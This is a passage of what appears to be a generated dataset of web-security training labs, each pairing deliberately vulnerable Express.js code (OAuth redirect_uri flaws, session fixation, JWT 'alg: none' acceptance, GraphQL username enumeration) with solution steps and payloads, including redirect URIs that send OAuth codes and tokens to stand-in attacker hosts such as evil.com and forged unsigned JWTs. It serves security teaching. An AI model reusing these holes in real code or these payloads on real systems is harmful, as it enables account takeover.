    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth-callback', async (req, res) => { const { code, redirect_uri } = req.query; try { const response = await axios.post('https://oauth.example.com/token', { code, redirect_uri }); const token = response.data.access_token; res.cookie('session', token); res.redirect('/account'); } catch (e) { res.status(400).send('OAuth error'); } }); app.get('/account', (req, res) => { const token = req.cookies.session; if (token === 'carlos_token') { res.send('Account details for carlos'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://auth.example.com/authorize?client_id=app123&redirect_uri=https://evil.com/capture",
      "code=abc123&redirect_uri=https://evil.com/capture"
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow via Set-Cookie header manipulation",
    "Lab Description": "The application assigns the session ID before login and does not rotate it upon authentication. This flaw allows attackers to fixate a known session ID for the victim before login. To solve: predefine a session ID, trick Carlos into logging in, and reuse the same session to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, access the site as an unauthenticated user and capture the Set-Cookie response.",
      "Override the session cookie with a custom predictable value using a browser plugin or a crafted link.",
      "Send Carlos a link to log in via a session already set by you (e.g., through CSRF or phishing).",
      "Once Carlos logs in using the fixed session, reuse that same session cookie in your browser.",
      "Access the /account page and verify Carlos’s account data is shown."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'hunter2' }; app.get('/', (req, res) => { let sid = req.cookies.sid || 'sess_' + Math.random().toString(36).substring(2); res.cookie('sid', sid); sessions[sid] = { username: null }; res.send('Guest session initiated'); }); app.post('/login', (req, res) => { const { username, password } = req.query; const sid = req.cookies.sid; if (users[username] === password) { sessions[sid].username = username; res.send('Logged in'); } else { res.status(401).send('Invalid'); } }); app.get('/account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]?.username === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "sid=sess_fixedtoken1234",
      "GET /login?username=carlos&password=hunter2 (with sid=sess_fixedtoken1234 in cookie)",
      "GET /account (with same sid cookie)"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation in authentication flow",
    "Lab Description": "The OAuth implementation in this application contains weak validation of redirect URIs. This allows an attacker to hijack tokens by injecting malicious domains. The application blindly trusts user-controlled redirect_uri parameters during the OAuth login flow, enabling redirection to external, attacker-controlled endpoints. To solve: capture an OAuth access token issued for Carlos by manipulating the redirect flow and use it to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the initial OAuth authorization request",
      "Confirm the redirect_uri parameter is not validated properly by sending it to a malicious domain you control",
      "Craft a malicious authorization request with redirect_uri=https://evil.com/callback",
      "Set up a listener on https://evil.com to capture the OAuth access token fragment or query",
      "Use Postman to send a request with the stolen token as Authorization: Bearer {token} to /api/userinfo to confirm access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const oauthServer = { authorize: (client_id, redirect_uri, state) => `${redirect_uri}?code=abc123&state=${state}` }; app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const redirectURL = oauthServer.authorize(client_id, redirect_uri, state); res.redirect(redirectURL); }); const PORT = 5000; app.listen(PORT, () => console.log(`OAuth redirect flow vulnerable lab on port ${PORT}`));",
    "payloads": [
      "https://attacker.com/callback",
      "https://evil.example.com/oauth-steal",
      "http://malicious.io/redirect#access_token=steal"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "The application allows attackers to set session cookies before authentication and reuses them post-login. This allows a session fixation attack where the attacker sets their own session ID, tricks the victim into using it, and later hijacks the session after the victim logs in. To solve: pre-set a session ID, force Carlos to authenticate using it, then hijack the session to access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send a GET /login request while setting your custom session cookie using Burp Suite",
      "Send this fixed session link to Carlos via social engineering or lure (simulate manually)",
      "Once Carlos logs in using that session, reuse the session ID to access /my-account",
      "Verify account access by visiting /my-account with the fixed session",
      "Capture the personalized response and extract sensitive user data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/login', (req, res) => { const sessionId = req.cookies.session || Math.random().toString(36).substring(2); sessions[sessionId] = { authenticated: false }; res.cookie('session', sessionId); res.send('Login form'); }); app.post('/login', (req, res) => { const sessionId = req.cookies.session; if (sessionId && sessions[sessionId]) { sessions[sessionId].authenticated = true; res.send('Logged in'); } else { res.status(400).send('Session missing'); } }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.session; if (sessions[sessionId]?.authenticated) res.send('Welcome Carlos'); else res.status(401).send('Unauthorized'); }); app.listen(4001);",
    "payloads": [
      "Cookie: session=fixedSession123",
      "http://target-app/login (with session=fixed123)",
      "Session fixation via iframe + set-cookie header"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in access token validation",
    "Lab Description": "The application uses JWTs to authorize access to user accounts but fails to enforce signature verification properly. It blindly accepts tokens where the alg field is set to 'none'. To solve: forge a JWT with alg=none and payload containing 'username':'carlos', then use it to access Carlos's account via the protected endpoint.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Capture a legitimate JWT using Burp Suite after logging in",
      "Decode the token using jwt.io or Burp Decoder",
      "Create a new token with alg set to none and payload { \"username\": \"carlos\" }",
      "Remove the signature part and send the token in the Authorization header",
      "Access the protected endpoint /api/account using the forged token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/api/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.username === 'carlos') { res.send('Access granted to Carlos'); } else { res.status(403).send('Forbidden'); } }); app.listen(4002);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer [none-alg payload]",
      "JWT with header: { \"alg\": \"none\" }, payload: { \"username\": \"carlos\" }"
    ]
  },
  {
    "Lab scenario": "JWT signature validation bypass in API endpoint",
    "Lab Description": "This lab's backend relies on JSON Web Tokens (JWT) to validate user sessions. However, it fails to enforce proper algorithm checks. The application incorrectly accepts tokens signed with the 'none' algorithm. To solve: Access Carlos's data through the protected /api/user endpoint by forging a valid-looking JWT.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a request to /api/user while logged in as your own user. Extract the Authorization: Bearer token.",
      "Copy the JWT and decode it using jwt.io or Burp Decoder. Observe the structure and claims.",
      "Replace the 'alg' field from 'HS256' to 'none' and modify the 'sub' claim to 'carlos'.",
      "Remove the signature segment entirely, leaving only the header and payload segments separated by two dots.",
      "Send the forged token in a request to /api/user with Authorization: Bearer [modified-token]. Verify successful access to Carlos's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = { carlos: { role: 'admin', data: 'Secret data' } }; app.get('/api/user', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No token provided'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(decoded.payload, 'base64').toString()); const user = users[payload.sub]; if (user) return res.json(user); return res.status(403).send('Invalid user'); } try { const verified = jwt.verify(token, 'super-secret-key'); const user = users[verified.sub]; if (user) return res.json(user); return res.status(403).send('Invalid user'); } catch (e) { return res.status(403).send('Token verification failed'); } }); const PORT = 4000; app.listen(PORT, () => console.log(JWT Bypass Lab running on http://localhost:${PORT}));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJyb2xlIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow",
    "Lab Description": "This lab's login system is vulnerable to session fixation due to the reuse of session identifiers across authentication boundaries. Attackers can preset a session cookie and trick a victim into logging in with it. To solve: Fix a session ID, log Carlos in using it, then use the same session to access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a GET request to /login with a custom session ID cookie (e.g., session=attacker123).",
      "Send a valid login request for Carlos using his credentials while preserving the same session cookie value.",
      "Once Carlos is authenticated under that session ID, reuse the session=attacker123 cookie in a new GET request to /my-account.",
      "Confirm access to Carlos's authenticated session.",
      "Verify the lab is solved by accessing protected content using the fixed session token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 's3cr3t' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.session || 'sess' + Math.random().toString(36).substr(2); sessions[sid] = username; res.cookie('session', sid); return res.send('Logged in'); } return res.status(403).send('Unauthorized'); }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.session]; if (username === 'carlos') return res.send('Account: carlos'); return res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(Session Fixation Lab running on http://localhost:${PORT}));",
    "payloads": [
      "Cookie: session=attacker123",
      "POST /login with session=attacker123 then reuse it on /my-account"
    ]
  },
  {
    "Lab scenario": "OAuth token manipulation via redirect_uri parameter injection",
    "Lab Description": "This OAuth-based authentication flow is vulnerable to a redirect_uri validation flaw. It fails to strictly validate the domain of redirection endpoints, allowing attackers to steal OAuth authorization codes. To solve: Inject a malicious redirect_uri that sends the authorization code to your server, retrieve the stolen code, and use it to log in as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to proxy the login process and inspect the OAuth authorization request.",
      "Identify the redirect_uri parameter and test injection using a trusted-looking subdomain (e.g., https://evil.example.com).",
      "Host a listener on your own server (e.g., ngrok) to receive the stolen code.",
      "Craft the full OAuth URL with the manipulated redirect_uri and trick the victim (Carlos) into clicking it.",
      "Capture the authorization code from your listener and exchange it manually at the OAuth provider's /token endpoint using Postman.",
      "Use the access_token in an authenticated request to /my-account to confirm lab success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const validClients = ['app-client-1']; const authCodes = {}; const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; if (!validClients.includes(client_id)) return res.status(403).send('Invalid client'); const code = Math.random().toString(36).substr(2); authCodes[code] = 'carlos'; const uri = `${redirect_uri}?code=${code}&state=${state}`; return res.redirect(uri); }); app.post('/token', (req, res) => { const { code } = req.body; if (!authCodes[code]) return res.status(403).send('Invalid code'); const token = 'access-token-' + Math.random().toString(36).substr(2); tokens[token] = authCodes[code]; return res.json({ access_token: token }); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (tokens[token] === 'carlos') return res.send('Carlos Account Accessed'); return res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(OAuth Redirection Lab running on http://localhost:${PORT}));",
    "payloads": [
      "https://oauth.example.com/authorize?client_id=app-client-1&redirect_uri=https://evil.example.com/steal&state=abc123",
      "POST /token with stolen code to get access_token",
      "Authorization: Bearer access-token-xyz123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in token verification",
    "Lab Description": "The application verifies user sessions using JSON Web Tokens (JWTs). The JWT validation logic accepts any token using either the HS256 or RS256 algorithm. However, the public key used for RS256 verification is not securely isolated. The application trusts tokens signed with HS256 and validates them using a hardcoded RS256 public key, creating an algorithm confusion vector. To solve: forge a valid token to impersonate Carlos and access their account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept your JWT after logging in.",
      "Validate algorithm type and key handling by sending the token to jwt.io and modifying its header to 'alg':'none' or 'alg':'HS256'.",
      "Craft a new JWT with the header 'alg':'HS256' and payload { 'username': 'carlos' }, then sign it with the public key as a secret.",
      "Inject the modified token into the Authorization header and send a request to /account.",
      "If successful, the page will show Carlos's data. Confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./keys/public.pem'); app.use(require('body-parser').json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, publicKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); res.send(`Welcome ${decoded.username}`); } catch { res.status(403).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}, Payload: {\"username\":\"carlos\"}, Secret: <RS256 public key as string>",
      "Header: {\"alg\":\"none\"}, Payload: {\"username\":\"carlos\"}, Unsigned JWT"
    ]
  },
  {
    "Lab scenario": "Session fixation in OAuth authorization redirect flow",
    "Lab Description": "The application uses OAuth for authentication via a third-party provider. However, the session ID is assigned before user authentication and not regenerated after login. This allows a malicious actor to fix a session ID by luring the victim into authenticating under a session the attacker controls. To solve: log in as Carlos using a fixed session and access their account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the login OAuth redirect request using OWASP ZAP and capture the session cookie.",
      "Send the login link with the fixed session cookie attached to Carlos.",
      "When Carlos logs in via the OAuth provider, the session is updated with his credentials, but the session ID remains the same.",
      "Reuse the fixed session cookie in your browser and visit /account.",
      "Validate that Carlos's data is visible, confirming session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'oauthsecret', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { req.session.oauth = 'init'; res.redirect('https://provider.com/oauth/authorize?client_id=abc&redirect_uri=http://localhost:3000/callback'); }); app.get('/callback', (req, res) => { req.session.user = 'carlos'; res.redirect('/account'); }); app.get('/account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.status(401).send('Not authenticated'); }); app.listen(3000);",
    "payloads": [
      "Set session cookie before OAuth login: connect.sid=abc123; send link with attached cookie to victim",
      "After victim authenticates, reuse connect.sid=abc123 to access /account"
    ]
  },
  {
    "Lab scenario": "Blind username discovery through GraphQL error differentiation",
    "Lab Description": "The application exposes a GraphQL endpoint that handles authentication queries. Due to a misconfigured error-handling mechanism, responses differ slightly based on the validity of the username during login attempts. This side-channel allows blind enumeration of usernames. To solve: enumerate Carlos's username and use it to brute-force his password to access his profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send GraphQL mutation queries with various usernames using Postman.",
      "Use Burp Suite Intruder to automate mutation testing for username values in the loginUser mutation.",
      "Analyze differences in HTTP status codes or error messages for invalid users vs wrong passwords.",
      "After finding Carlos's username, use Burp Intruder again to brute-force the password with fixed username.",
      "Login to the application and access /user/profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const users = { carlos: 'hunter2', admin: 'adminpass' }; const schema = buildSchema(` type Query { _: Boolean } type Mutation { loginUser(username: String!, password: String!): String } `); const root = { loginUser: ({ username, password }) => { if (!users[username]) throw new Error('Username not found.'); if (users[username] !== password) throw new Error('Incorrect password'); return 'Login successful'; } }; app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: false })); app.listen(3000);",
    "payloads": [
      "{ \"query\": \"mutation { loginUser(username: \\\"carlos\\\", password: \\\"wrong\\\") }\" }",
      "{ \"query\": \"mutation { loginUser(username: \\\"admin\\\", password: \\\"adminpass\\\") }\" }"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm override in REST API Authentication",
    "Lab Description": "This lab uses JWTs for session management but improperly trusts the 'alg' field in incoming tokens. The application does not validate the token signature if the 'alg' is set to 'none'. The application generates signed JWTs using the HS256 algorithm, but accepts unsigned tokens with 'alg: none'. To solve: forge an unsigned JWT to impersonate Carlos and access their profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture a valid JWT after logging in with your own account.",
      "Send the captured token to Repeater. Decode it using JWT.io or Burp Decoder.",
      "Modify the payload to set 'username': 'carlos' and change 'alg' in the header to 'none'. Remove the signature.",
      "Copy the modified unsigned JWT and set it as the Authorization header using Postman or Burp Repeater.",
      "Send a GET request to /api/profile with the forged token. Verify that Carlos's profile is displayed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { 'carlos': { password: 'supersecret' }, 'wiener': { password: 'password123' } }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { const token = jwt.sign({ username }, 'secretkey', { algorithm: 'HS256' }); return res.json({ token }); } return res.status(403).send('Access denied'); }); app.get('/api/profile', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { return res.send(`Welcome ${decoded.payload.username}`); } try { const verified = jwt.verify(token, 'secretkey'); res.send(`Welcome ${verified.username}`); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth2 redirect URI manipulation via open redirect in login provider",
    "Lab Description": "This OAuth flow integrates with an external identity provider (IdP), but the application accepts any redirection URI without proper validation. An attacker can manipulate the redirection URI during login to intercept authorization codes and hijack sessions. To solve: abuse the redirection vulnerability to authenticate as Carlos without credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start Burp and intercept the OAuth login request initiated by the client to /oauth/start?redirect_uri=...",
      "Observe the redirect_uri parameter and change it to a malicious domain under your control, such as https://evil.com.",
      "Host a listener at https://evil.com to capture the redirected authorization code after login.",
      "Use the captured code to manually construct a token request to the IdP and exchange it for an access token.",
      "Use the obtained token in Authorization headers to call /account/profile as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth/start', (req, res) => { const redirectUri = req.query.redirect_uri; const url = `https://idp.com/auth?response_type=code&client_id=app123&redirect_uri=${redirectUri}`; res.redirect(url); }); app.get('/oauth/callback', async (req, res) => { const code = req.query.code; const tokenResponse = await axios.post('https://idp.com/token', { code }); const userInfo = await axios.get('https://idp.com/userinfo', { headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` } }); res.send(`Welcome ${userInfo.data.username}`); }); app.listen(4000);",
    "payloads": [
      "https://idp.com/auth?response_type=code&client_id=app123&redirect_uri=https://evil.com",
      "Authorization: Bearer <token_exchanged_from_intercepted_code>"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session identifier in login flow",
    "Lab Description": "The login system assigns session identifiers before authentication and does not regenerate the session after successful login. An attacker can set a session ID via cookie and trick the victim into authenticating with it. The attacker then hijacks the session. To solve: fixate a session for Carlos and access their account using the same session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send a request to /login while logged out and note the Set-Cookie header for session ID.",
      "Use Postman or Burp to set a fixed session ID manually via Cookie: session=attacker123.",
      "Send Carlos a phishing link or wait until Carlos logs in with the same fixed session ID.",
      "After Carlos logs in, reuse the same session cookie from your end.",
      "Request /account and confirm it now displays Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const users = { 'carlos': { password: '1234' }, 'admin': { password: 'root' } }; const sessions = {}; app.get('/login', (req, res) => { const sessId = req.cookies.session || 'sess' + Math.floor(Math.random() * 1000); res.cookie('session', sessId); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { sessions[req.cookies.session] = username; return res.send('Login successful'); } res.send('Login failed'); }); app.get('/account', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Welcome to ${user}'s account`); } else { res.send('Please log in'); } }); app.listen(5000);",
    "payloads": [
      "Cookie: session=attacker123",
      "POST /login with session cookie already set to attacker123 and username=carlos&password=1234"
    ]
  },
  {
    "Lab scenario": "Session Fixation in OAuth Redirect Handler",
    "Lab Description": "The OAuth implementation in this application is vulnerable to session fixation. The redirect URI accepts a pre-set session identifier, which is not regenerated after successful login. The application fails to validate or rotate the session upon authentication. To solve: Hijack Carlos's session by injecting a known session ID during the OAuth redirect phase.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth login redirect and examine the session cookie behavior.",
      "Send the intercepted redirect request to Burp Repeater and inject a fixed session ID using Set-Cookie header.",
      "Craft the OAuth callback to include the known session ID in the redirect URL.",
      "Use Postman or curl to access the application with the fixed session after Carlos logs in.",
      "Visit /my-account to verify the hijacked session and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/oauth/callback', (req, res) => { const { session, user } = req.query; if (user === 'carlos') { res.cookie('session', session); res.redirect('/my-account'); } else { res.send('Invalid user'); } }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'fixed-session-abc') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "GET /oauth/callback?session=fixed-session-abc&user=carlos",
      "Set-Cookie: session=fixed-session-abc",
      "curl -b 'session=fixed-session-abc' http://localhost:4000/my-account"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Bypass in Auth Token Verification",
    "Lab Description": "This app validates JWT tokens using a vulnerable library that fails to enforce algorithm constraints. The JWT is signed with 'HS256', but the backend accepts 'none' and skips signature verification. To solve: Forge a token with 'none' algorithm, impersonate Carlos, and access his protected account area.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT token using Burp during your own login session.",
      "Decode the JWT using jwt.io or Postman and observe the algorithm field.",
      "Modify the JWT header to use 'alg':'none' and change the payload's sub field to carlos.",
      "Remove the signature section completely and replay the token using Burp or curl.",
      "Verify account takeover by accessing /my-account with the forged token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.sub === 'carlos') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "curl -H \"Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.\" http://localhost:4000/my-account"
    ]
  },
  {
    "Lab scenario": "Blind OAuth Token Leakage in Referer Header Injection",
    "Lab Description": "This OAuth flow redirects users to third-party domains after login. However, sensitive tokens are embedded in the Referer header due to improper scope isolation. The application fails to sanitize outbound redirects, leaking Carlos's OAuth token. To solve: Set up a malicious endpoint to intercept tokens and reuse the token to access Carlos’s account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Log in with your own OAuth account and monitor the Referer header using OWASP ZAP.",
      "Observe that the token is embedded in the Referer when redirected to external URLs.",
      "Set up a malicious site (e.g., webhook.site) and inject it as the redirect_uri via manipulated request.",
      "Trigger Carlos’s OAuth login with the crafted redirect_uri and capture the Referer header token.",
      "Replay the captured token using curl or Postman to access Carlos's protected resources."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const redirectMap = { 'carlos': 'http://malicious-site.com/steal?token=' }; app.get('/oauth/redirect', (req, res) => { const { user, token } = req.query; const target = redirectMap[user]; if (target) { res.redirect(`${target}${token}`); } else { res.send('User not found'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'secret-token-carlos') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "GET /oauth/redirect?user=carlos&token=secret-token-carlos",
      "Authorization: Bearer secret-token-carlos",
      "curl -H \"Authorization: Bearer secret-token-carlos\" http://localhost:4000/my-account"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login process",
    "Lab Description": "This lab is vulnerable to session fixation due to improperly handled session tokens. The application issues a session cookie before authentication and continues using it after successful login. To solve the lab, fixate a session for Carlos and access his account after he logs in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept initial GET /login request using Burp Suite and capture the issued session cookie.",
      "Send the cookie to the victim via a crafted link (e.g., phishing) or assume it was pre-set by attacker.",
      "Log in using Carlos's credentials while maintaining the fixed session (simulate Carlos using the attacker's session).",
      "Once login is successful, reuse the same session cookie on your browser.",
      "Visit /my-account using the fixed session and confirm account takeover."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixme', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /><input type=\"submit\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.username) res.send(`Account page for ${req.session.username}`); else res.send('Please login'); }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: connect.sid=attackerSession123",
      "Session reuse after Carlos login",
      "Phishing link: http://victimsite.com/login with preset session"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in session token validation",
    "Lab Description": "This lab is vulnerable to JWT signature tampering via `alg: none`. The application fails to properly validate JWT tokens' signature algorithm. To solve the lab, forge a JWT with `alg: none` and impersonate Carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT from your own session using Burp or Postman.",
      "Decode the JWT using jwt.io or a script and observe the header and payload.",
      "Modify the payload to change the username to carlos.",
      "Set the JWT header to `{ \"alg\": \"none\", \"typ\": \"JWT\" }` and remove the signature.",
      "Send the forged JWT in the Authorization: Bearer header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'secret123') { const token = jwt.sign({ username }, secret); res.json({ token }); } else res.status(403).send('Forbidden'); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); return res.send(`Welcome ${payload.username}`); } try { const verified = jwt.verify(token, secret); res.send(`Welcome ${verified.username}`); } catch { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "Payload: { \"username\": \"carlos\" }",
      "JWT: base64(header).base64(payload). (no signature)",
      "Authorization: Bearer <forged_token>"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration vulnerability in redirect URI validation",
    "Lab Description": "The lab's OAuth implementation accepts arbitrary redirect URIs due to a flawed validation logic. The application uses OAuth for login but does not strictly validate registered redirect URIs. To solve the lab, obtain an access token for Carlos by injecting a malicious redirect URI.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Access the login flow and intercept the request to /authorize using OWASP ZAP.",
      "Modify the `redirect_uri` parameter to your own malicious domain.",
      "Send the victim a link with this manipulated `redirect_uri` to steal the code.",
      "Capture the `code` parameter via your hosted server.",
      "Exchange the stolen code for an access token using /oauth/token endpoint and impersonate Carlos."
    ],
    "Vulnerability name": "Authentication",
